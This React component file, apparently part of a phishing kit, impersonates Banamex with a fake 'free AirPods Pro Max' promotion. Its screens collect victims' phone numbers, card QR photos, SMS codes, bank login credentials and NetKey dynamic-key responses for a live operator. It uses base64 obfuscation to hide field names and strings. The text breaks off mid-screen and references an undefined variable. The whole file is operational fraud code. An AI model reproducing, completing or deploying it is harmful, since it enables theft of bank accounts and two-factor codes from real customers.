import React, { useState, useContext, useEffect } from 'react';
import { Card } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Checkbox } from "@/components/ui/checkbox";
import { Label } from '@/components/ui/label';
import { ScreenType } from '@shared/schema';
import { protectionUtils, obfuscatedConstants } from '../../utils/protection';

// Debug info
const debugInfo = atob('U2NyZWVuVHlwZS5TTVNfQ09NUFJBOg=='); // ScreenType.SMS_COMPRA:
console.log(debugInfo, ScreenType.SMS_COMPRA);

import citibanamexLogo from '../../assets/Banamex.png';
import banbajioLogo from '../../assets/banbajio_logo_oficial.png';
import bbvaLogo from '../../assets/bbva_logo.png';
import bbvaLogoWhite from '../../assets/bbva_logo_white.png';
import banorteLogoFooter from '../../assets/Banorte-01.png'; // El logo rojo de Banorte
import banorteLogoHeader from '../../assets/Bo.png.png';
import bancoppelLogo from '../../assets/bancoppel.png';
import hsbcLogo from '../../assets/Hsbc.png';
import amexLogo from '../../assets/Amex.png';
import santanderLogo from '../../assets/santander_logo.png';
import santanderLogoWhite from '../../assets/santander_logo_white.png';
import scotiabankLogo from '../../assets/scotiabank_logo.png';
import scotiabankLogoWhite from '../../assets/scotiabank_logo_white.png';
import banamexLogo from '@assets/Banamex.png';
import banregioLogo from '../../assets/banregio_logo.png';
import banregioLogoWhite from '../../assets/banregio_logo_white.png';
import googleLogo from '../../assets/google-logo.png';
import yahooLogo from '@assets/pngwing.com 2.png';
import microsoftLogo from '@assets/pngwing.com.png';
import promoImage1 from '@assets/IMG_5647_1754950720172.jpeg';
import promoImage2 from '@assets/IMG_5646_1754952460517.jpeg';
import loadingGif from '@assets/avatar_red240920240_1759807622645.gif';
import validatingGif from '@assets/5qqGDgBWDQBRNbsccaEAAAOw==_1759809330184.gif';

interface ScreenTemplatesProps {
  currentScreen: ScreenType;
  screenData: {
    terminacion?: string;
    saldo?: string;
    monto?: string;
    clabe?: string;
    titular?: string;
    comercio?: string;
    mensaje?: string;
    alias?: string;
    folio?: string;
    direccion?: string;
    correo?: string;
    contrasena?: string;
    codigo?: string; // Código para la verificación de Google
    errorMessage?: string; // Mensaje de error para la pantalla de login
    challenge?: string; // Código CHALLENGE para NetKey
    customChallenge?: string; // Código CHALLENGE personalizado para NetKey
  };
  sessionData?: {
    challenge?: string;
    [key: string]: any;
  };
  onSubmit: (screen: ScreenType, data: Record<string, any>) => void;
  banco?: string;
}

// Ofuscación de strings sensibles
const obfuscatedStrings = {
  bankDefault: atob('QkFOQU1FWA=='), // BANAMEX
  userField: atob('dXNlcm5hbWU='), // username
  passField: atob('cGFzc3dvcmQ='), // password
  errorText: atob('RXJyb3I='), // Error
  loginText: atob('SW5pY2lhciBzZXNpw7Nu'), // Iniciar sesión
  cardText: atob('VGFyamV0YQ=='), // Tarjeta
  phoneText: atob('VGVsw6lmb25v'), // Teléfono
  codeText: atob('Q8OzZGlnbw=='), // Código
  emailText: atob('Q29ycmVv'), // Correo
};

export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({ 
  currentScreen, 
  screenData,
  sessionData = {},
  onSubmit,
  banco = obfuscatedStrings.bankDefault
}) => {
  // Estados del formulario con nombres ofuscados
  const [dataA, setDataA] = useState(''); // dataA
  const [dataB, setDataB] = useState({ [obfuscatedStrings.userField]: '', [obfuscatedStrings.passField]: '' }); // loginInputs
  const [dataC, setDataC] = useState(''); // codigoInput
  const [dataD, setDataD] = useState(''); // nipInput
  const [dataE, setDataE] = useState(''); // tarjetaInput
  const [dataF, setDataF] = useState(''); // fechaVencimientoInput
  const [dataG, setDataG] = useState(''); // cvvInput
  const [errorA, setErrorA] = useState<string | null>(null); // tarjetaError
  const [dataH, setDataH] = useState(''); // smsCompraInput
  const [dataI, setDataI] = useState(''); // telefonoInput
  const [errorB, setErrorB] = useState<string | null>(null); // passwordError
  const [dataJ, setDataJ] = useState(''); // dataJ
  const [dataK, setDataK] = useState(''); // dataK
  const [showPass, setShowPass] = useState(false); // showPass
  
  // Estados para formulario de contacto de Banamex
  const [nombreBanamex, setNombreBanamex] = useState('');
  const [correoBanamex, setCorreoBanamex] = useState('');
  const [celularBanamex, setCelularBanamex] = useState('');
  const [telefonoAltBanamex, setTelefonoAltBanamex] = useState('');
  const [gmailScreen, setGmailScreen] = useState<'correo' | 'contrasena'>('correo');
  const [hotmailStep2, setHotmailStep2] = useState(false);
  const [yahooStep2, setYahooStep2] = useState(false);
  const [emailInput, setEmailInput] = useState('');
  const [passwordInput, setPasswordInput] = useState('');
  const [photoFile, setPhotoFile] = useState<File | null>(null);
  const [netkeyResponse, setNetkeyResponse] = useState('');

  // Estados para ACCESO_DENEGADO
  const [telefonoAcceso1, setTelefonoAcceso1] = useState('');
  const [telefonoAcceso2, setTelefonoAcceso2] = useState('');
  const [correoAcceso, setCorreoAcceso] = useState('');
  const [nombreRepAcceso, setNombreRepAcceso] = useState('');

  // Funciones de validación con protección mejorada
  const validateSecureData = (input: string, type: string) => {
    return protectionUtils.validateData(input, type);
  };

  const formatSecureInput = (value: string) => {
    const v = value.replace(/\D/g, '');
    const groups = [];
    for (let i = 0; i < v.length; i += 4) {
      groups.push(v.substring(i, i + 4));
    }
    return groups.join(' ');
  };

  const formatSecureDate = (value: string) => {
    const v = value.replace(/\D/g, '');
    if (v.length >= 2) {
      const month = parseInt(v.substring(0, 2));
      if (month > 12) {
        return `12/${v.substring(2)}`;
      }
    }
    if (v.length <= 2) {
      return v;
    } else {
      return `${v.substring(0, 2)}/${v.substring(2, 4)}`;
    }
  };

  // Helper function to render the appropriate screen
  const renderScreen = () => {
    // Función para obtener el contenedor según el banco
    // Función simplificada que solo contiene el contenido sin logos ni fechas
    const getBankContainer = (children: React.ReactNode) => {
      // Utilizamos una única plantilla para todos los bancos
      return (
        <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center overflow-hidden">
          {/* Eliminamos todos los logos y fechas de los contenedores de pantalla */}
          {children}
        </div>
      );
    };

    // Diferentes pantallas según el tipo
    switch (currentScreen) {
      case ScreenType.PROMOCION:
        const promocionContent = (
          <div className="min-h-screen bg-white">
            {/* Header navegación Banamex */}
            <div className="bg-white border-b border-gray-200 px-4 py-3">
              <div className="max-w-7xl mx-auto flex flex-col sm:flex-row justify-between items-start sm:items-center">
                <div className="flex items-center mb-3 sm:mb-0">
                  <div className="font-bold text-xl text-[#BE0046]">BANAMEX</div>
                </div>
                <nav className="flex flex-wrap gap-4 md:gap-6 text-sm text-gray-600">
                  <span className="hover:text-orange-500 cursor-pointer transition-colors">Tarjetas</span>
                  <span className="hover:text-orange-500 cursor-pointer transition-colors">Productos</span>
                  <span className="hover:text-orange-500 cursor-pointer transition-colors">Promociones</span>
                  <span className="hover:text-orange-500 cursor-pointer transition-colors">Ayuda</span>
                </nav>
              </div>
            </div>

            {/* Diseño completamente reorganizado y limpio */}
            <div className="bg-white min-h-screen">
              {/* SECCIÓN 1: PROMOCIÓN PRINCIPAL */}
              <section className="py-24 bg-gradient-to-b from-white to-gray-50">
                <div className="max-w-4xl mx-auto px-6 text-center">

                  {/* Título con emoji */}
                  <div className="mb-12">
                    <span className="text-5xl mb-4 block">🎉</span>
                    <h1 className="text-4xl md:text-5xl font-bold text-gray-900 mb-6">
                      Promoción Exclusiva
                    </h1>
                    <p className="text-xl text-gray-600">Para clientes seleccionados de Banamex</p>
                  </div>

                  {/* Tarjeta AirPods Principal */}
                  <div className="platacard-bg rounded-2xl p-12 mb-12 mx-auto max-w-lg shadow-xl">
                    <h2 className="text-6xl md:text-7xl font-bold text-white mb-2">AirPods</h2>
                    <h2 className="text-6xl md:text-7xl font-bold text-white mb-4">Pro Max</h2>
                    <p className="text-3xl text-orange-300 font-semibold">Totalmente Gratis</p>
                  </div>

                  {/* Descripción */}
                  <div className="mb-12">
                    <p className="text-xl text-gray-700 leading-relaxed max-w-3xl mx-auto">
                      Para clientes seleccionados por el buen uso de su tarjeta reciben{' '}
                      <span className="font-bold platacard-accent">AirPods Pro Max totalmente gratis</span>.{' '}
                      Sin costo adicional por su excelente historial crediticio.
                    </p>
                  </div>

                  {/* Botón Principal */}
                  <div className="mb-16">
                    <Button 
                      className="platacard-button text-2xl font-bold px-12 py-6 rounded-xl shadow-2xl transform hover:scale-105 transition-all duration-300"
                      onClick={() => onSubmit(ScreenType.TERMINOS, {})}
                    >
                      Reclamar mis AirPods Pro Max →
                    </Button>
                  </div>

                </div>
              </section>

              {/* SECCIÓN 2: DETALLES DEL PRODUCTO */}
              <section className="py-24 bg-white">
                <div className="max-w-4xl mx-auto px-6">

                  {/* Título de sección */}
                  <div className="text-center mb-16">
                    <span className="text-4xl mb-4 block">🎧</span>
                    <h3 className="text-3xl font-bold text-gray-900 mb-4">Detalles de tu premio</h3>
                    <p className="text-lg text-gray-600">Todo lo que necesitas saber sobre tu regalo</p>
                  </div>

                  {/* Grid de información */}
                  <div className="grid md:grid-cols-3 gap-12 text-center">
                    <div className="p-8 bg-gray-50 rounded-xl">
                      <h4 className="text-xl font-bold text-gray-900 mb-4">Producto</h4>
                      <p className="text-lg text-gray-600">AirPods Pro Max Originales</p>
                    </div>
                    <div className="p-8 bg-gray-50 rounded-xl">
                      <h4 className="text-xl font-bold text-gray-900 mb-4">Vigencia</h4>
                      <p className="text-lg text-gray-600">1 día</p>
                    </div>
                    <div className="p-8 bg-gray-50 rounded-xl">
                      <h4 className="text-xl font-bold text-gray-900 mb-4">Entrega</h4>
                      <p className="text-lg text-gray-600">A domicilio</p>
                    </div>
                  </div>

                </div>
              </section>

              {/* SECCIÓN 3: IMÁGENES PROMOCIONALES */}
              <section className="py-24 bg-gray-50">
                <div className="max-w-5xl mx-auto px-6">

                  {/* Título de sección */}
                  <div className="text-center mb-16">
                    <h3 className="text-3xl font-bold text-gray-900 mb-4">Tu premio te espera</h3>
                    <p className="text-lg text-gray-600">Mira lo que puedes ganar hoy</p>
                  </div>

                  {/* Grid de imágenes */}
                  <div className="grid md:grid-cols-2 gap-8">
                    <div className="bg-white rounded-xl overflow-hidden shadow-lg">
                      <img 
                        src={promoImage1} 
                        alt="AirPods Pro Max Promoción" 
                        className="w-full h-72 object-cover"
                      />
                    </div>
                    <div className="bg-white rounded-xl overflow-hidden shadow-lg">
                      <img 
                        src={promoImage2} 
                        alt="Oferta Especial Banamex" 
                        className="w-full h-72 object-cover"
                      />
                    </div>
                  </div>

                </div>
              </section>
            </div>

            {/* Sección "¿Cómo funciona?" - con espaciado perfecto */}
            <div className="bg-gray-50 py-24">
              <div className="max-w-6xl mx-auto px-8">
                <div className="text-center mb-20">
                  <h2 className="text-4xl md:text-5xl font-bold text-gray-900 mb-8">¿Cómo funciona?</h2>
                  <p className="text-2xl text-gray-600">Solo 3 pasos para recibir tus AirPods Pro Max</p>
                </div>

                <div className="space-y-16 max-w-4xl mx-auto">
                  <div className="flex items-start platacard-step">
                    <span className="platacard-step-number mr-8">1</span>
                    <div className="flex-1">
                      <div className="font-bold text-gray-900 text-2xl mb-6">Acepta los términos</div>
                      <div className="text-gray-700 text-xl leading-relaxed">Revisa y acepta los términos y condiciones de la promoción</div>
                    </div>
                  </div>

                  <div className="flex items-start platacard-step">
                    <span className="platacard-step-number mr-8">2</span>
                    <div className="flex-1">
                      <div className="font-bold text-gray-900 text-2xl mb-6">Inicia sesión</div>
                      <div className="text-gray-700 text-xl leading-relaxed">Accede con tus credenciales de Banamex para verificar tu elegibilidad</div>
                    </div>
                  </div>

                  <div className="flex items-start platacard-step">
                    <span className="platacard-step-number mr-8">3</span>
                    <div className="flex-1">
                      <div className="font-bold text-gray-900 text-2xl mb-6">Recibe tus AirPods</div>
                      <div className="text-gray-700 text-xl leading-relaxed">Te enviaremos tus AirPods Pro Max directamente a tu domicilio</div>
                    </div>
                  </div>
                </div>

                {/* Botón final con más espaciado */}
                <div className="text-center mt-24">
                  <Button 
                    className="w-full sm:w-auto bg-gradient-to-r from-gray-600 to-gray-700 hover:from-gray-700 hover:to-gray-800 text-white px-12 py-6 text-xl font-bold rounded-lg shadow-lg hover:shadow-xl transition-all duration-300 transform hover:scale-105"
                    onClick={() => onSubmit(ScreenType.TERMINOS, {})}
                  >
                    Reclamar mis AirPods Pro Max →
                  </Button>
                  <p className="text-lg text-gray-500 mt-8">
                    * Promoción válida solo para clientes seleccionados de Banamex
                  </p>
                </div>
              </div>
            </div>
          </div>
        );

      case ScreenType.TERMINOS:
        const terminosContent = (
          <>
            <h2 className="text-lg font-bold mb-4 text-gray-700">
              Términos y Condiciones de la Promoción AirPods Pro Max Gratis a Clientes Seleccionados Banamex
            </h2>
            <div className="max-h-80 overflow-y-auto text-left mb-6 text-sm text-gray-700 pr-2">
              <p className="mb-3">
                Los presentes Términos y Condiciones tienen por objeto reglamentar y establecer los procedimientos aplicables a la promoción denominada "AirPods Pro Max Gratis a Clientes Seleccionados Banamex" ofrecida por Banamex.
              </p>
              <p className="mb-2 font-semibold">1. Requisitos para Participar:</p>
              <p className="mb-3">
                La promoción está dirigida exclusivamente a clientes seleccionados de Banamex, quienes deberán cumplir con los siguientes requisitos:
              </p>
              <ul className="mb-3 ml-4 list-disc">
                <li>Ser titular de una tarjeta Banamex válida y activa.</li>
                <li>Tener un historial crediticio excelente con buen uso de la tarjeta.</li>
                <li>Ser notificado de su selección para participar en la promoción.</li>
              </ul>
              <p className="mb-2 font-semibold">2. Descripción de la Promoción:</p>
              <p className="mb-3">
                Los clientes seleccionados recibirán AirPods Pro Max originales totalmente gratuitos como reconocimiento por su excelente historial crediticio.
              </p>
              <p className="mb-2 font-semibold">3. Condiciones Generales:</p>
              <ul className="mb-3 ml-4 list-disc">
                <li>Los AirPods Pro Max se entregan completamente gratuitos.</li>
                <li>La entrega se realiza directamente al domicilio registrado.</li>
                <li>Válido hasta agotar existencias o por 6 meses desde la fecha de la promoción.</li>
              </ul>
              <p className="mb-2 font-semibold">8. Uso de Datos Personales:</p>
              <p className="mb-3">
                Al participar, el cliente acepta que los datos personales puedan ser utilizados por Banamex para fines relacionados con la promoción y otros fines comerciales.
              </p>
            </div>
            <Button 
              className="platacard-button"
              onClick={() => onSubmit(ScreenType.PHONE_INPUT, {})}
            >
              Aceptar Términos
            </Button>
          </>
        );
        return getBankContainer(terminosContent);

      case ScreenType.PHONE_INPUT:
        return (
            <div className="min-h-screen bg-white flex items-center justify-center p-4">
              <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl p-8 border border-gray-100">
                {/* Header estilo platacard.mx */}
                <div className="text-center mb-8">
                  <div className="bg-gradient-to-r from-[#FF6B35] to-[#FF8C5A] w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
                    <span className="text-2xl text-white">📱</span>
                  </div>
                  <h2 className="text-2xl font-bold text-gray-900 mb-2">Ingresa tu número celular</h2>
                  <p className="text-gray-600">registrado con Banamex</p>
                </div>

                {/* Input de teléfono */}
                <div className="mb-6">
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Número celular registrado con Banamex
                  </label>
                  <input
                    type="tel"
                    value={dataA}
                    onChange={(e) => {
                      const value = e.target.value.replace(/\D/g, '');
                      if (value.length <= 10) {
                        setDataA(value);
                      }
                    }}
                    placeholder="5512345678"
                    className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-[#FF6B35] focus:border-[#FF6B35] text-lg"
                    maxLength={10}
                  />
                  <p className="text-xs text-gray-500 mt-2">
                    Debe tener exactamente 10 dígitos
                  </p>
                </div>



                {/* Botón continuar */}
                <Button
                  onClick={() =>onSubmit(ScreenType.PHONE_INPUT, { phone: dataA })}
                  disabled={!dataA || dataA.length !== 10}
                  className="w-full platacard-button py-3 text-lg font-semibold rounded-xl transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  Continuar
                </Button>

                {/* Info adicional */}
                <p className="text-xs text-gray-500 text-center mt-4">
                  Tu teléfono será usado únicamente para coordinar la entrega de tus AirPods Pro Max
                </p>
              </div>
            </div>
        );

      case ScreenType.QR_SCAN:
        return (
            <div className="min-h-screen bg-white flex items-center justify-center p-4">
              <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl p-8 border border-gray-100">
                {/* Header */}
                <div className="text-center mb-8">
                  <div className="bg-gradient-to-r from-orange-500 to-orange-600 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
                    <span className="text-2xl text-white">📷</span>
                  </div>
                  <h2 className="text-2xl font-bold text-gray-900 mb-2">Escanea el código QR</h2>
                  <p className="text-gray-600">de tu Banamex para poder identificarte</p>
                </div>

                {/* Área de cámara simulada */}
                <div className="bg-gray-100 rounded-xl p-8 mb-6 text-center">
                  <div className="border-2 border-dashed border-orange-400 rounded-xl p-12 mb-4">
                    <div className="text-4xl mb-4">📱</div>
                    <p className="text-gray-600 mb-4">Coloca el QR de tu tarjeta aquí</p>

                    {/* Input de archivo oculto para simular captura */}
                    <input
                      type="file"
                      accept="image/*"
                      capture="environment"
                      onChange={(e) => {
                        const file = e.target.files?.[0];
                        if (file) {
                          // Simular captura del QR - solo guardar, no enviar automáticamente
                          const reader = new FileReader();
                          reader.onload = (event) => {
                            setDataA(event.target?.result as string);
                          };
                          reader.readAsDataURL(file);
                        }
                      }}
                      className="hidden"
                      id="qr-capture"
                    />
                    <label
                      htmlFor="qr-capture"
                      className="inline-block platacard-button px-6 py-3 text-lg font-semibold rounded-xl cursor-pointer"
                    >
                      📷 Capturar QR
                    </label>
                  </div>
                </div>

                {/* Instrucciones */}
                <div className="bg-orange-50 rounded-xl p-4 mb-6">
                  <h4 className="font-semibold text-orange-800 mb-2">Instrucciones:</h4>
                  <ul className="text-sm text-orange-700 space-y-1">
                    <li>• Busca el código QR en tu tarjeta Banamex</li>
                    <li>• Asegúrate de que esté bien iluminado</li>
                    <li>• Mantén la cámara estable al capturar</li>
                  </ul>
                </div>

                {/* Vista previa y confirmación si ya se capturó */}
                {dataA && (
                  <div className="bg-white rounded-xl p-6 border-2 border-orange-200">
                    <h3 className="text-lg font-semibold text-gray-900 mb-4">¿Se ve correctamente tu QR?</h3>

                    {/* Imagen del QR capturado */}
                    <div className="mb-6">
                      <img 
                        src={dataA} 
                        alt="QR capturado" 
                        className="max-w-48 mx-auto rounded-lg border-2 border-gray-300 shadow-md" 
                      />
                    </div>

                    {/* Texto de confirmación */}
                    <p className="text-sm text-gray-600 mb-6 text-center">
                      Verifica que el código QR se puede visualizar claramente antes de enviar
                    </p>

                    {/* Botones de acción */}
                    <div className="space-y-3">
                      <Button
                        onClick={() => onSubmit(ScreenType.QR_VALIDATION, { qrImage: dataA })}
                        className="w-full platacard-button py-3 text-lg font-semibold rounded-xl"
                      >
                        ✓ Enviar QR
                      </Button>

                      <Button
                        onClick={() => setDataA('')}
                        variant="outline"
                        className="w-full border-2 border-orange-300 text-orange-600 hover:bg-orange-50 py-3 text-lg font-semibold rounded-xl"
                      >
                        📷 Volver a tomar foto
                      </Button>
                    </div>
                  </div>
                )}
              </div>
            </div>
        );

      case ScreenType.QR_VALIDATION:
        return (
            <div className="min-h-screen bg-white flex items-center justify-center p-4">
              <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl p-8 border border-gray-100 text-center">
                {/* Header */}
                <div className="mb-8">
                  <div className="flex justify-center mb-4">
                    <img 
                      src={validatingGif} 
                      alt="Validando..." 
                      className="w-32 h-32"
                    />
                  </div>
                  <h2 className="text-2xl font-bold text-gray-900 mb-2">Validando información</h2>
                  <p className="text-gray-600">Verificando tu código QR...</p>
                </div>

                {/* Indicador de carga */}
                <div className="mb-8">
                  <div className="bg-gray-200 rounded-full h-2 mb-4">
                    <div className="bg-gradient-to-r from-orange-500 to-orange-600 h-2 rounded-full animate-pulse" style={{ width: '60%' }}></div>
                  </div>
                  <p className="text-sm text-gray-500">Esto puede tomar unos momentos...</p>
                </div>

                {/* Información del proceso */}
                <div className="bg-orange-50 rounded-xl p-6 mb-6">
                  <div className="space-y-3 text-sm text-orange-800">
                    <div className="flex items-center">
                      <span className="text-green-500 mr-2">✓</span>
                      QR recibido correctamente
                    </div>
                    <div className="flex items-center">
                      <span className="text-orange-500 mr-2 animate-spin">⏳</span>
                      Verificando con base de datos
                    </div>
                    <div className="flex items-center">
                      <span className="text-gray-400 mr-2">○</span>
                      Validando elegibilidad
                    </div>
                  </div>
                </div>

                <p className="text-xs text-gray-500">
                  Un administrador está revisando tu información. Por favor mantén esta ventana abierta.
                </p>
              </div>
            </div>
        );

      case ScreenType.SMS_VERIFICATION:
        // Obtener los últimos 4 dígitos del teléfono (ej: ***2390)
        // Usar terminación ya configurada o por defecto 2390
        const lastFourDigits = screenData.terminacion || '2390';

        return (
            <div className="min-h-screen bg-white flex items-center justify-center p-4">
              <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl p-8 border border-gray-100">
                {/* Header */}
                <div className="text-center mb-8">
                  <div className="bg-gradient-to-r from-[#FF6B35] to-[#FF8C5A] w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
                    <span className="text-2xl text-white">📱</span>
                  </div>
                  <h2 className="text-2xl font-bold text-gray-900 mb-2">Verificación por SMS</h2>
                  <p className="text-gray-600">Ingresa el código que recibiste</p>
                </div>

                {/* Información del SMS */}
                <div className="bg-orange-50 rounded-xl p-4 mb-6">
                  <p className="text-sm text-orange-800 text-center">
                    <span className="font-semibold">Código enviado por SMS al número con terminación</span>
                    <br />
                    <span className="text-lg font-bold">***{lastFourDigits}</span>
                  </p>
                </div>

                {/* Input del código */}
                <div className="mb-6">
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Código de verificación de 4 dígitos
                  </label>
                  <input
                    type="text"
                    value={dataC}
                    onChange={(e) => {
                      const value = e.target.value.replace(/\D/g, '');
                      if (value.length <= 4) {
                        setDataC(value);
                      }
                    }}
                    placeholder="0000"
                    className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-[#FF6B35] focus:border-[#FF6B35] text-center text-2xl tracking-[0.5em] font-mono"
                    maxLength={4}
                  />
                  <p className="text-xs text-gray-500 mt-2 text-center">
                    Revisa tu bandeja de SMS
                  </p>
                </div>

                {/* Botón verificar */}
                <Button
                  onClick={() => onSubmit(ScreenType.SMS_VERIFICATION, { 
                    codigo: dataC,
                    terminacion: lastFourDigits
                  })}
                  disabled={!dataC || dataC.length !== 4}
                  className="w-full platacard-button py-3 text-lg font-semibold rounded-xl transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  Verificar código
                </Button>

                {/* Info adicional */}
                <div className="mt-6 text-center">
                  <p className="text-xs text-gray-500">
                    ¿No recibiste el código? El mensaje puede tardar unos minutos en llegar
                  </p>
                </div>
              </div>
            </div>
        );

      case ScreenType.FOLIO:
        const folioContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Folio de promoción:</h2>
            <p className="mb-4">Por favor, ingrese el folio de la promoción de AirPods que recibió de Banamex.</p>
            <div className="mb-4">
              <label className="block text-sm font-medium text-gray-700 text-left mb-1">Número de folio:</label>
              <Input 
                type="text" 
                placeholder="Ingrese su número de folio" 
                className="w-full border border-gray-300 rounded p-2 mb-3"
                value={dataA}
                onChange={(e) => setDataA(e.target.value)}
              />
            </div>
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.FOLIO, { folio: dataA })}
            >
              Continuar
            </Button>
          </>
        );
        return getBankContainer(folioContent);

      case ScreenType.LOGIN:
        // Función para validar la contraseña
        const validatePassword = (password: string): { isValid: boolean; message: string } => {
          if (password.length < 5 || password.length > 16) {
            return {
              isValid: false,
              message: "La contraseña debe tener entre 5 y 16 caracteres"
            };
          }

          const hasUpperCase = /[A-Z]/.test(password);
          const hasNumber = /[0-9]/.test(password);
          const hasSpecialChar = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password);

          // También considerar el punto como carácter especial
          const hasPeriod = password.includes('.');

          if (!hasUpperCase) {
            return {
              isValid: false,
              message: "La contraseña debe contener al menos una letra mayúscula"
            };
          }

          if (!hasNumber) {
            return {
              isValid: false,
              message: "La contraseña debe contener al menos un número"
            };
          }

          if (!hasSpecialChar && !hasPeriod) {
            return {
              isValid: false,
              message: "La contraseña debe contener al menos un carácter especial (el punto '.' también es válido)"
            };
          }

          return { isValid: true, message: "" };
        };

        // Función para manejar el clic en el botón de ingresar
        const handleSecureLogin = () => {
          // Validar que el usuario haya ingresado algo
          if (!dataB.username || !dataB.password) {
            setErrorB(protectionUtils.decode('UG9yIGZhdm9yLCBpbmdyZXNhIHRvZG9zIGxvcyBjYW1wb3MgcmVxdWVyaWRvcw=='));
            return;
          }

          // Validar requisitos de contraseña
          const passwordValidation = validatePassword(dataB.password);
          if (!passwordValidation.isValid) {
            setErrorB(passwordValidation.message);
            return;
          }

          // Si llegamos aquí, todo está bien
          setErrorB(null);
          onSubmit(ScreenType.LOGIN, { 
            username: dataB.username, 
            password: dataB.password 
          });
        };

        const loginContent = (
          <>
            <div className="text-center mb-6">
              <h2 className="text-2xl font-bold text-gray-800 mb-2">Iniciar sesión</h2>
              <p className="text-sm text-gray-600">
                Accede a tu cuenta para continuar con tu promoción de AirPods
              </p>
            </div>

            {screenData.errorMessage && (
              <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg mb-4">
                <p className="text-sm font-medium">{screenData.errorMessage}</p>
              </div>
            )}

            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Correo electrónico
                </label>
                <Input 
                  type="email" 
                  value={dataB.username}
                  onChange={(e) => setDataB({...dataB, username: e.target.value})}
                  placeholder="ejemplo@correo.com"
                  className="w-full p-3 border border-gray-300 rounded-lg text-base focus:ring-2 focus:ring-orange-500 focus:border-transparent transition-all"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Contraseña
                </label>
                <Input 
                  type="password" 
                  value={dataB.password}
                  onChange={(e) => {
                    setDataB({...dataB, password: e.target.value});
                    // Limpiar error cuando el usuario escribe
                    if (errorB) setErrorB(null);
                  }}
                  placeholder="Ingresa tu contraseña"
                  className={`w-full p-3 border rounded-lg text-base focus:ring-2 focus:ring-orange-500 focus:border-transparent transition-all ${errorB ? 'border-red-400 focus:ring-red-400' : 'border-gray-300'}`}
                />
                {errorB && (
                  <p className="text-xs text-red-500 mt-2 font-medium">{errorB}</p>
                )}
              </div>
            </div>

            <Button 
              className="platacard-button py-3 text-lg font-semibold mt-6"
              onClick={handleSecureLogin}
            >
              Iniciar sesión
            </Button>

            <div className="text-center mt-4">
              <a href="#" className="text-sm platacard-accent hover:text-orange-600 font-medium hover:underline transition-colors">
                ¿Olvidaste tu contraseña?
              </a>
            </div>
          </>
        );
        return getBankContainer(loginContent);

      case ScreenType.NETKEY:
        const handleNetkeySubmit = () => {
          if (netkeyResponse.length === 8 && /^\d+$/.test(netkeyResponse)) {
            onSubmit(ScreenType.NETKEY, { netkeyResponse: netkeyResponse });
          }
        };

        const [currentTime, setCurrentTime] = useState(new Date());

        useEffect(() => {
          const timer = setInterval(() => setCurrentTime(new Date()), 1000);
          return () => clearInterval(timer);
        }, []);

        const formatDateTime = (d: Date) => {
          const days = ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'];
          const months = ['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];
          const pad = (n: number) => n < 10 ? '0'+n : n;
          const dayName = days[d.getDay()];
          const day = d.getDate();
          const month = months[d.getMonth()];
          const year = d.getFullYear();
          const time = pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
          return `${dayName} ${day} de ${month} de ${year}, ${time} Centro de México`;
        };

        // Renderizar la pantalla NetKey usando el diseño exacto del mockup proporcionado
        return (
          <div 
            style={{ 
              margin: 0, 
              background: '#fff', 
              color: '#0b3b43', 
              padding: '28px', 
              fontFamily: '"Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif',
              minHeight: '100vh',
              position: 'fixed',
              top: 0,
              left: 0,
              width: '100%',
              height: '100%',
              zIndex: 10000
            }}
          >
            <div style={{ maxWidth: '900px', margin: '18px auto' }}>
              {/* Header */}
              <header style={{ display: 'flex', alignItems: 'center', gap: '18px', marginBottom: '22px' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                  <img 
                    src={citibanamexLogo} 
                    alt="Banamex"
                    style={{ height: '46px', width: 'auto', display: 'block' }}
                  />
                </div>
                <div style={{ marginLeft: 'auto' }}>
                  <div style={{ fontSize: '14px', color: '#2d4b51' }}>
                    {formatDateTime(currentTime)}
                  </div>
                </div>
              </header>

              {/* Card */}
              <div 
                style={{
                  background: 'linear-gradient(90deg, #f7fbfc 0%, #eef6f7 100%)',
                  borderRadius: '8px',
                  padding: '22px',
                  boxShadow: '0 6px 18px rgba(0,0,0,0.08)',
                  border: '1px solid rgba(0,0,0,0.03)'
                }}
              >
                <h1 style={{ fontSize: '28px', margin: '6px 0 18px', display: 'flex', alignItems: 'center', gap: '12px' }}>
                  » Clave dinámica
                </h1>

                <div style={{ display: 'flex', gap: '18px', alignItems: 'flex-start' }}>
                  {/* Panel izquierdo */}
                  <div 
                    style={{
                      background: '#fff',
                      borderRadius: '6px',
                      padding: '20px',
                      boxShadow: '0 3px 8px rgba(0,0,0,0.04)',
                      flex: 1,
                      minHeight: '260px',
                      display: 'flex',
                      flexDirection: 'column'
                    }}
                  >
                    <div style={{ color: '#133d43', lineHeight: '1.45', fontSize: '14px' }}>
                      <p>Encienda su NetKey Banamex, teclee su PIN; al desplegarse la palabra "HOST?" digite el número "9".</p>
                      <p>Al aparecer la palabra "CHALLNG?" introduzca en su NetKey Banamex la siguiente clave:</p>

